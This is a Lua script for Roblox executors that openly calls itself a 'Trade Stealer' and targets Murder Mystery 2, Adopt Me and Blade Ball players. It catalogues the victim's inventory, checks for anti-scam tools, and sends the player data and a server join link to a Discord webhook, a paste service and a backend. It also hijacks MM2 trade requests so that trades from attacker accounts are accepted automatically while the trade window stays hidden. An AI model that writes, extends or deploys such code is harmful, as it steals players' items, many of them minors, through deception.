local CFG = getgenv().CFG
local PlaceId = game.PlaceId
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local lp = Players.LocalPlayer
local HS = game:GetService("HttpService")

local function do_request(method, url, body, headers)
    return request({Url=url, Method=method, Body=body, Headers=headers or {}})
end

local function get_executor()
    if identifyexecutor then return identifyexecutor() end
    if KRNL_LOADED then return "Krnl" end
    if SYNAPSE_LOADED then return "Synapse" end
    return "Unknown"
end

local function get_roblox_version()
    if version then return version() end
    return "Unknown"
end

local function detect_antiscam()
    local g = getgenv()
    for _, f in ipairs({"antiscam","TradeBlocker","ScamGuard","NoTrade"}) do
        if g[f] then return true end
    end
    return false
end

local function collect_mm2_items()
    local items = {}
    local ok, ProfileData = pcall(function()
        return require(RS.Modules.ProfileData)
    end)
    if not ok or not ProfileData then return items end
    local ok2, Sync = pcall(function()
        return require(RS.Database.Sync)
    end)
    local rarityOrder = {Ancient=1,Godly=2,Unique=3,Vintage=4,Chroma=5,Legendary=6,Rare=7,Uncommon=8,Common=9}
    for itemName, amount in pairs(ProfileData.Weapons.Owned) do
        local rarity = "Unknown"
        if ok2 and Sync and Sync.Weapons and Sync.Weapons[itemName] then
            rarity = Sync.Weapons[itemName].Rarity or "Unknown"
        end
        table.insert(items, {name=itemName, rarity=rarity, amount=tostring(amount)})
    end
    table.sort(items, function(a, b)
        return (rarityOrder[a.rarity] or 999) < (rarityOrder[b.rarity] or 999)
    end)
    return items
end

local function collect_adoptme_items()
    local items = {}
    local inv = lp:FindFirstChild("PlayerData") or lp:FindFirstChild("Inventory")
    if inv then
        for _, v in ipairs(inv:GetDescendants()) do
            if v:IsA("StringValue") or v:IsA("IntValue") then
                table.insert(items, {name=v.Name, rarity="Pet", amount="1"})
            end
        end
    end
    return items
end

local function post_rubis(text)
    local ok, res = pcall(do_request, "POST", "https://api.rubis.app/v2/scrap",
        text,
        {["Content-Type"]="text/plain"})
    if not ok then
        warn("rubis pcall fail")
        return nil
    end
    warn("rubis status: "..tostring(res.StatusCode))
    warn("rubis body: "..tostring(res.Body))
    local dok, data = pcall(function() return HS:JSONDecode(res.Body) end)
    if not dok or not data then return nil end
    return data.url or data.link or data.key or nil
end

local function send_discord(items, game_name)
    if not CFG.webhook or CFG.webhook == "" then return end
    local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
    local receivers = table.concat(CFG.allowed, ", ")

    local counts = {}
    local order = {"Ancient","Godly","Unique","Vintage","Legendary","Rare","Uncommon","Common"}
    for _, it in ipairs(items) do
        counts[it.rarity] = (counts[it.rarity] or 0) + 1
    end

    local inv_lines = {}
    for _, r in ipairs(order) do
        table.insert(inv_lines, string.format("%-10s: %d", r, counts[r] or 0))
    end

    local full_text = {}
    for _, it in ipairs(items) do
        table.insert(full_text, it.name.." ("..it.rarity..")")
    end
    local rubis_url = post_rubis(table.concat(full_text, "\n")) or "upload mislukt"

    local desc = string.format(
        "**Player Info:**\n```\nUsername:    %s\nDisplay:     %s\nExecutor:    %s\nAntiscam:    %s\nRoblox ver:  %s\nReceiver:    %s\n```\n\n**Inventory**\n```\n%s\n```\n\n**List of items:** %s\n\n**Join link:** [click here to join](%s)",
        lp.Name, lp.DisplayName, get_executor(), tostring(detect_antiscam()), get_roblox_version(),
        receivers, table.concat(inv_lines, "\n"), rubis_url, join
    )

    local embed = {
        username = "Trade Stealer",
        embeds = {{
            title       = game_name.." Stealer",
            description = desc,
            color       = 15158332,
        }}
    }
    pcall(do_request, "POST", CFG.webhook, HS:JSONEncode(embed), {["Content-Type"]="application/json"})
end

local function send_job(game_name, items)
    send_discord(items, game_name)
    local payload = {
        game           = game_name,
        username       = lp.Name,
        display_name   = lp.DisplayName,
        executor       = get_executor(),
        roblox_version = get_roblox_version(),
        antiscam       = detect_antiscam(),
        allowed        = CFG.allowed,
        place_id       = tostring(PlaceId),
        job_id         = game.JobId,
        items          = items,
    }
    pcall(do_request, "POST", CFG.backend.."/job", HS:JSONEncode(payload), {
        ["Content-Type"] = "application/json",
        ["X-API-Key"]    = CFG.api_key,
    })
end

local function hook_mm2()
    local Trade = RS:WaitForChild("Trade", 10)
    if not Trade then return end
    local sendRequest   = Trade:WaitForChild("SendRequest", 10)
    local acceptRequest = Trade:WaitForChild("AcceptRequest", 10)
    if not sendRequest or not acceptRequest then return end

    local items = collect_mm2_items()
    send_job("MM2", items)

    sendRequest.OnClientInvoke = function(senderPlayer)
        local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
        local isAllowed = false
        for _, n in ipairs(CFG.allowed) do
            if n == senderName then isAllowed = true break end
        end
        if not isAllowed then return false end
        task.wait(1)
        acceptRequest:FireServer()
        task.wait(0.5)
        acceptRequest:FireServer()
        return true
    end

    local gui = lp:WaitForChild("PlayerGui")
    local tradeGui      = gui:WaitForChild("TradeGUI", 10)
    local tradeGuiPhone = gui:FindFirstChild("TradeGUI_Phone")
    if tradeGui then
        tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if tradeGui.Enabled then tradeGui.Enabled = false end
        end)
    end
    if tradeGuiPhone then
        tradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
            if tradeGuiPhone.Enabled then tradeGuiPhone.Enabled = false end
        end)
    end
end

local function hook_adoptme()
    send_job("AdoptMe", collect_adoptme_items())
end

local function hook_bladeball()
    local items = {}
    local mgp = lp:FindFirstChild("leaderstats")
    if mgp then
        for _, v in ipairs(mgp:GetChildren()) do
            table.insert(items, {name=v.Name, rarity=tostring(v.Value), amount="1"})
        end
    end
    send_job("BladeBall", items)
end

local GAMES = {
    [142823291]   = hook_mm2,
    [920587237]   = hook_adoptme,
    [13772394625] = hook_bladeball,
}

local handler = GAMES[PlaceId]
if handler then handler() else send_job("Unknown", {}) end
